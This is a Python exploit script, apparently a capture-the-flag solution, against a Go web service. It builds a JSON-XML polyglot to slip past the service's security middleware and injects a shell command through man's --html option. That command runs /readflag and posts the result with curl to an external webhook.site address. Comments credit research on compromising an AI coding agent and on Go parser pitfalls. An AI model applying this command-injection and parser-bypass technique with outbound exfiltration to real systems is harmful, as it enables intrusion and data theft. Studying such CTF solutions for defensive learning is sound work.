#!/usr/bin/env python3
import requests

# url = "http://localhost:8080"
url = "https://glotq-xgb72.instancer.lac.tf"
webhook = "https://webhook.site/06558408-9b1d-49ca-8d3e-06b882505f37"

# --html doesn't like ":" for some reason
webhook = webhook.replace("https://", "")
command = f"""
FLAG=$(/readflag); curl -X POST {webhook} -d flag=$FLAG
""".replace("\n", "")

"""
man supports the --html option to allow users to specify a command to
render the manual page as HTML.

I learned about this option from the following research done by RyotaK.
https://flatt.tech/research/posts/pwning-claude-code-in-8-different-ways/
"""
xml = f"""
<?xml version="1.0"?>
<request>
<command>man</command>
<args>
<arg>--html={command}</arg>
<arg>jq</arg>
</args>
</request>
""".replace("\n", "")

# Escape quotes to be placed inside JSON
xml = xml.replace('"', '\\"')

"""
Go's JSON / YAML / XML parsers have a lot of flexibility and footguns.
This was highlighted by Trail of Bits in the following blog post.
https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/

Using the technique described there, we build a JSON-XML polyglot to bypass
the security middleware.
"""
raw = f"""
{{
"command": "man",
"args": ["jq"],
"random": "{xml}"
}}
"""

raw = raw.encode()

headers = {
    "Content-Type": "application/json"
}
r = requests.post(
    f"{url}/xml",
    data=raw,
    headers=headers
)

res = r.json()

if res.get("success"):
    print("Output:", res.get("output"))
else:
    print("Error:", res.get("error"))

print(f"Check https://{webhook} for the flag!")
